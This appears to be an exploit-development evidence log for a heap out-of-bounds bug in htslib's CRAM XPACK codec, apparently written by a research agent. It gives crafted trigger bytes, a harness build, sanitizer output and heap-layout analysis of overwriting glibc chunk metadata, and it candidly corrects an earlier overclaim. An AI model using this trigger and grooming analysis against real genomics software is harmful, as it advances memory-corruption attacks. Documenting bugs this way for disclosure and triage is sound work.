# Parser-path evidence — CVE-2026-62257 (2026-11-21)

## What this is

`parser_harness.c` feeds a **real CRAM v4 compression-header wire byte stream**
to the pinned 1.23.1 `cram_decode_compression_header()` (`cram/cram_decode.c:144`).
The XPACK codec and its `codec_id` therefore arise from file-derived bytes
through the actual parser — unlike frontier's `harness.c`, which constructed a
stand-in `hdr` and set `hdr->ncodecs` directly before calling
`cram_decoder_init()`. The only remaining stand-in is the 512-entry
`block_by_id` allocation, verbatim in shape from pinned `cram_io.c:4620`.

Wire bytes (17 total), with `map_size` including the `map_count` varint byte
as the parser requires (`cp_copy` is captured before `map_count` is read):

```
01 00                                  preservation map: size=1 count=0
0c 01                                  record enc map: size=12 count=1
51 53 33 07 04 02 00 01 01 01 00      key "QS", encoding=51 (E_XPACK),
                                       size=7, XPACK params
01 00                                  tag enc map: size=1 count=0
```

`decode_init[51] = cram_xpack_decode_init` (`cram_codecs.c:3867`) with no
version gate in `cram_decoder_init` (`:3872-3889`); `cram_decoder_init`
assigns `codec_id = hdr->ncodecs++` for every constructed codec, so the
EXTERNAL sub-codec takes id 0 and the XPACK codec takes id 1.

## Commands

```
cd lab/frontier/htslib2shell/parserpath
V=../build-vuln
gcc -g -O0 -fsanitize=address -fsanitize-recover=address \
  -I"$V" -I"$V/cram" -I"$V/htslib" -o parser-asan parser_harness.c \
  "$V/libhts.a" -ldeflate -lz -lpthread -lm -ldl
ASAN_OPTIONS=detect_leaks=0:halt_on_error=0 ./parser-asan > asan.log 2>&1
V=../build-plain   # same flags minus sanitizers -> parser-plain, plain.log
```

## Observed

ASan (`asan.log`, rc 0 with recovered mode):

```
INFO hdr=0x519000000080
INFO ncodecs=2 after real parser
INFO QS codec=0x51d000000080 codec_id=1 encoding=51
INFO calling get_block -> cache index 512+codec_id=513
INFO get_block returned 0x507000000170
RESULT PASS
ERROR: AddressSanitizer: heap-buffer-overflow ... READ of size 8
    #0 cram_xpack_decode_expand_char cram/cram_codecs.c:1378
    #1 cram_xpack_get_block cram/cram_codecs.c:1449
0x...508 is located 8 bytes after 4096-byte region
ERROR: AddressSanitizer: heap-buffer-overflow ... WRITE of size 8
    #0 cram_xpack_decode_expand_char cram/cram_codecs.c:1388
    #1 cram_xpack_get_block cram/cram_codecs.c:1449
```

Unsanitized (`plain.log`, rc 0): same accounting lines; the post-call read of
the OOB slot returns `0x61` (junk adjacent-heap value; frontier's direct-call
harness saw `0x1011`). No crash. This is an observation, not a chosen value.

## Honest limits

- Still a harness: no whole CRAM file container/BGZF framing, no `htsfile` or
  web consumer, no real slice-record decode. The compression-header bytes are
  real wire format and the decoder is the real one, but this is not the full
  file path.
- `block_by_id` is allocated by the harness, not by `cram_read_slice`.
- No live neighbour object, chosen pointer value, control-flow diversion or
  execution observed. Rung 4 remains INSTRUMENTED.
- Negative result preserved: first attempt used `map_size=0` for the empty
  maps; the parser rejected the header (nr 0, RESULT FAIL). `map_size` counts
  the `map_count` byte too — corrected to `1`.

## Consumer-reality analysis (AGENTS.md lesson) — 16:50–16:56Z

Pinned `cram_io.c:4601-4637` (`cram_read_slice`) allocates, in order:

```
s->block       = calloc(n, sizeof(*s->block));      /* :4601 */
  ... cram_read_block() x n ...                      /* :4604 */
s->block_by_id = calloc(512, sizeof(s->block[0]));  /* :4620  4096 user bytes */
  ... fill external blocks into indices 0..506 ...   /* no allocations */
s->cigar       = malloc(1024 * sizeof(uint32_t));   /* :4633  4096 user bytes */
```

`allocprobe.c` reproduces this allocation order on this host:

```
block_by_id = 0x585e6e688410
cigar       = 0x585e6e689420
cigar - block_by_id = 4112 bytes
```

4112 = 4096 user bytes + 16-byte glibc chunk header, i.e. the two 4096-byte
allocations ARE adjacent. Consequently:

- index 512 (offset 4096) = next chunk `prev_size`
- index 513 (offset 4104) = next chunk **`size` field**

So the frontier/parser OOB at `codec_id=1` (index 513) writes the freshly
allocated `cram_block *` over the glibc chunk-size metadata of the slice's
`s->cigar` allocation — allocator metadata, not a live object's pointer field.
This also explains frontier's observed adjacent value `0x1011`: chunk size
4112 (`0x1010`) with `PREV_INUSE` set is `0x1011`.

Impact on rung 4: the store is real and reaches live heap metadata in a real
slice, but corrupting a chunk `size` field is a different (allocator-metadata)
exploitation route than overwriting a vtable/function pointer. No chosen
value, heap grooming, control-flow diversion or execution was demonstrated.
Rung 4 stays INSTRUMENTED.

Caveat: the probe omits `cram_read_block()` calls, which all occur BEFORE
`block_by_id`; nothing is allocated between `block_by_id` and `cigar`, so the
adjacency conclusion is unaffected. ASan inserts its own redzone, so the ASan
trace shows an OOB address but not the glibc metadata target; the glibc layout
claim comes from the plain-build probe and source lines, not from ASan.

## CORRECTION TO INHERITED RUNG 1 — 16:58–17:03Z (decisive)

`cram_xpack_decode_expand_char` (`cram_codecs.c:1377-1388`):

```c
cram_block *b = slice->block_by_id[512 + c->codec_id];
if (b) return 0;                       /* :1379-1380  EARLY RETURN */
...
b = slice->block_by_id[512 + c->codec_id] = cram_new_block(0, 0);  /* :1388 */
```

The WRITE is reachable only when the OOB slot reads NULL. Observations:

| build | natural OOB-slot value | write at :1388? | returned block |
|---|---|---|---|
| parser harness, plain | `0x61` (next chunk's `size`) | NO — early return | `0x61` junk |
| frontier harness, plain (`out-final/plain.log`) | `0x1011` (4112\|PREV_INUSE chunk size) | NO — early return | `0x1011` junk |
| parser harness, ASan recovered | zeroed redzone | YES | valid new block |

gdb proof on the plain build (`gdb-watch.log`, `gdb-watch-zeroed.log`):

- Natural: hardware watchpoint on `&slice->block_by_id[513]` set at function
  entry, `pre=0x61`, run to exit — watchpoint NEVER fired. No write.
- Forced `set *(void**)$oob = 0`, then watchpoint fired:
  `Old value = 0x0, New value = 0x555555677460`, breakpoint
  `cram_xpack_decode_expand_char cram/cram_codecs.c:1388`, call path
  `cram_xpack_get_block :1449 <- main`.

Therefore the inherited rung-1 claim ("unsanitized pinned library completes
the same OOB write") is **NOT supported**: both plain builds perform the OOB
READ and return adjacent junk; neither performs the OOB WRITE. The ASan WRITE
at :1388 fires only because ASan's redzone bytes read as zero. In this glibc
layout the bytes after `block_by_id` are a chunk `size` field, structurally
non-NULL, so the guard at :1379 skips the write in the natural heap state.

Rung 3 (ASan READ+WRITE) stays as OBSERVED UNDER ASAN with this caveat.
Rung 1 should be restated as: unsanitized OOB READ returning adjacent junk
(pointer-shaped garbage returned to the caller), not an unsanitized OOB write.
This is the AGENTS.md consumer-reality lesson applied: the consumer's actual
guard kills the write path on this host unless the slot is groomed to NULL.
